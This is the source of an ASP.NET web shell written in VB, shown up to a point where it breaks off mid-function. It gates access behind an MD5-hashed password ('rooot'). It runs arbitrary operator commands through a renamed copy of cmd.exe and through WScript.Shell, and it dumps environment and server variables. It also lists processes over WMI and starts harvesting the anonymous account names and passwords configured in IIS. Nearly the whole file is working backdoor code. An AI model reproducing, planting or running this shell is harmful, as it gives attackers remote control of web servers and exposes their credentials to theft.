<%@ Page ContentType="text/html" validateRequest="false" aspcompat="true"%>

<%@ Import Namespace="System.IO" %>

<%@ import namespace="System.Diagnostics" %>

<%@ import namespace="System.Threading" %>

<%@ import namespace="System.Text" %>

<%@ import namespace="System.Security.Cryptography" %>

<%@ Import Namespace="System.Net.Sockets"%>

<%@ Assembly Name="System.DirectoryServices, Version=2.0.0.0, Culture=neutral, PublicKeyToken=B03F5F7F11D50A3A" %>

<%@ import Namespace="System.DirectoryServices" %>

<%@ import Namespace="Microsoft.Win32" %>

<script language="VB" runat="server">

Dim PASSWORD as string = "e10adc3949ba59abbe56e057f20f883e"   '   rooot

dim url,TEMP1,TEMP2,TITLE as string

Function GetMD5(ByVal strToHash As String) As String

            Dim md5Obj As New System.Security.Cryptography.MD5CryptoServiceProvider()

            Dim bytesToHash() As Byte = System.Text.Encoding.ASCII.GetBytes(strToHash)

            bytesToHash = md5Obj.ComputeHash(bytesToHash)

            Dim strResult As String = ""

            Dim b As Byte

            For Each b In bytesToHash

                strResult += b.ToString("x2")

            Next

            Return strResult

End Function

Sub Login_click(sender As Object, E As EventArgs)

	if GetMD5(Textbox.Text)=PASSWORD then     
		session("rooot")=1

		session.Timeout=60

	else

		response.Write("<font color='red'>Your password is wrong! Maybe you press the ""Caps Lock"" buttom. Try again.</font><br>")

	end if

End Sub

'Run w32 shell

Declare Function WinExec Lib "kernel32" Alias "WinExec" (ByVal lpCmdLine As String, ByVal nCmdShow As Long) As Long

Declare Function CopyFile Lib "kernel32" Alias "CopyFileA" (ByVal lpExistingFileName As String, ByVal lpNewFileName As String, ByVal bFailIfExists As Long)  As Long



Sub RunCmdW32(Src As Object, E As EventArgs)

	dim command

	dim fileObject = Server.CreateObject("Scripting.FileSystemObject")		

	dim tempFile = Environment.GetEnvironmentVariable("TEMP") & "\"& fileObject.GetTempName( )

	If Request.Form("txtCommand1") = "" Then

		command = "dir c:\"	

	else 

		command = Request.Form("txtCommand1")

	End If	

	ExecuteCommand1(command,tempFile,txtCmdFile.Text)

	OutputTempFile1(tempFile,fileObject)

	'txtCommand1.text=""

End Sub

Sub ExecuteCommand1(command As String, tempFile As String,cmdfile As String)

	Dim winObj, objProcessInfo, item, local_dir, local_copy_of_cmd, Target_copy_of_cmd

	Dim objStartup, objConfig, objProcess, errReturn, intProcessID, temp_name

	Dim FailIfExists

	

	local_dir = left(request.servervariables("PATH_TRANSLATED"),inStrRev(request.servervariables("PATH_TRANSLATED"),"\"))

	'local_copy_of_cmd = Local_dir+"cmd.exe"

	'local_copy_of_cmd= "C:\\WINDOWS\\system32\\cmd.exe"

	local_copy_of_cmd=cmdfile

	Target_copy_of_cmd = Environment.GetEnvironmentVariable("Temp")+"\kiss.exe"

	CopyFile(local_copy_of_cmd, Target_copy_of_cmd,FailIfExists)

	errReturn = WinExec(Target_copy_of_cmd + " /c " + command + "  > " + tempFile , 10)

	response.write(errReturn)

	thread.sleep(500)

End Sub

Sub OutputTempFile1(tempFile,oFileSys)

	On Error Resume Next 

	dim oFile = oFileSys.OpenTextFile (tempFile, 1, False, 0)

	resultcmdw32.text=txtCommand1.text & vbcrlf & "<pre>" & (Server.HTMLEncode(oFile.ReadAll)) & "</pre>"

   	oFile.Close

   	Call oFileSys.DeleteFile(tempFile, True)	 

End sub

'End w32 shell

'Run WSH shell

Sub RunCmdWSH(Src As Object, E As EventArgs)

	dim command

	dim fileObject = Server.CreateObject("Scripting.FileSystemObject")

	dim oScriptNet = Server.CreateObject("WSCRIPT.NETWORK")

	dim tempFile = Environment.GetEnvironmentVariable("TEMP") & "\"& fileObject.GetTempName( )

	If Request.Form("txtcommand2") = "" Then

		command = "dir c:\"	

	else 

		command = Request.Form("txtcommand2")

	End If	  

	ExecuteCommand2(command,tempFile)

	OutputTempFile2(tempFile,fileObject)

	txtCommand2.text=""

End Sub

Function ExecuteCommand2(cmd_to_execute, tempFile)

	  Dim oScript

	  oScript = Server.CreateObject("WSCRIPT.SHELL")

      Call oScript.Run ("cmd.exe /c " & cmd_to_execute & " > " & tempFile, 0, True)

End function

Sub OutputTempFile2(tempFile,fileObject)

    On Error Resume Next

	dim oFile = fileObject.OpenTextFile (tempFile, 1, False, 0)

	resultcmdwsh.text=txtCommand2.text & vbcrlf & "<pre>" & (Server.HTMLEncode(oFile.ReadAll)) & "</pre>"

	oFile.Close

	Call fileObject.DeleteFile(tempFile, True)

End sub

'End WSH shell



'System infor

Sub output_all_environment_variables(mode)

   	Dim environmentVariables As IDictionary = Environment.GetEnvironmentVariables()

   	Dim de As DictionaryEntry

	For Each de In  environmentVariables

	if mode="HTML" then

	response.write("<b> " +de.Key + " </b>: " + de.Value + "<br>")

	else

	if mode="text"

	response.write(de.Key + ": " + de.Value + vbnewline+ vbnewline)

	end if		

	end if

   	Next

End sub

Sub output_all_Server_variables(mode)

    dim item

    for each item in request.servervariables

	if mode="HTML" then

	response.write("<b>" + item + "</b> : ")

	response.write(request.servervariables(item))

	response.write("<br>")

	else

		if mode="text"

			response.write(item + " : " + request.servervariables(item) + vbnewline + vbnewline)

		end if		

	end if

    next

End sub

'End sysinfor

Function Server_variables() As String

	dim item

	dim tmp As String

	tmp=""

    for each item in request.ServerVariables

    	if request.servervariables(item) <> ""

    	'response.write(item + " : " + request.servervariables(item) + vbnewline + vbnewline)

    	tmp =+ item.ToString + " : " + request.servervariables(item).ToString + "\n\r"

    	end if

    next

    return tmp

End function

'Begin List processes

Function output_wmi_function_data(Wmi_Function,Fields_to_Show)

		dim objProcessInfo , winObj, item , Process_properties, Process_user, Process_domain

		dim fields_split, fields_item,i



		'on error resume next



		table("0","","")

		Create_table_row_with_supplied_colors("black","white","center",Fields_to_Show)



		winObj = GetObject("winmgmts:{impersonationLevel=impersonate}!\\.\root\cimv2")

		objProcessInfo = winObj.ExecQuery("Select "+Fields_to_Show+" from " + Wmi_Function)					

		

		fields_split = split(Fields_to_Show,",")

		for each item in objProcessInfo	

			tr

				Surround_by_TD_and_Bold(item.properties_.item(fields_split(0)).value)

				if Ubound(Fields_split)>0 then

					for i = 1 to ubound(fields_split)

						Surround_by_TD(center_(item.properties_.item(fields_split(i)).value))				

					next

				end if

			_tr

		next

End function

Function output_wmi_function_data_instances(Wmi_Function,Fields_to_Show,MaxCount)

		dim objProcessInfo , winObj, item , Process_properties, Process_user, Process_domain

		dim fields_split, fields_item,i,count

		newline

		rw("Showing the first " + cstr(MaxCount) + " Entries")

		newline

		newline

		table("1","","")

		Create_table_row_with_supplied_colors("black","white","center",Fields_to_Show)

		_table

		winObj = GetObject("winmgmts:{impersonationLevel=impersonate}!\\.\root\cimv2")

'		objProcessInfo = winObj.ExecQuery("Select "+Fields_to_Show+" from " + Wmi_Function)					

		objProcessInfo = winObj.InstancesOf(Wmi_Function)					

		

		fields_split = split(Fields_to_Show,",")

		count = 0

		for each item in objProcessInfo		

			count = Count + 1

			table("1","","")

			tr

				Surround_by_TD_and_Bold(item.properties_.item(fields_split(0)).value)

				if Ubound(Fields_split)>0 then

					for i = 1 to ubound(fields_split)

						Surround_by_TD(item.properties_.item(fields_split(i)).value)				

					next

				end if

			_tr

			if count > MaxCount then exit for

		next

End function

'End List processes

'Begin IIS_list_Anon_Name_Pass

Sub IIS_list_Anon_Name_Pass()

		Dim IIsComputerObj, iFlags ,providerObj ,nodeObj ,item, IP

		

		IIsComputerObj = CreateObject("WbemScripting.SWbemLocator") 			' Create an instance of the IIsComputer object

		providerObj = IIsComputerObj.ConnectServer("127.0.0.1", "root/microsoftIISv2")

		nodeObj  = providerObj.InstancesOf("IIsWebVirtualDirSetting") '  - IISwebServerSetting

		

		Dim MaxCount = 20,Count = 0

		hr

		RW("only showing the first "+cstr(MaxCo
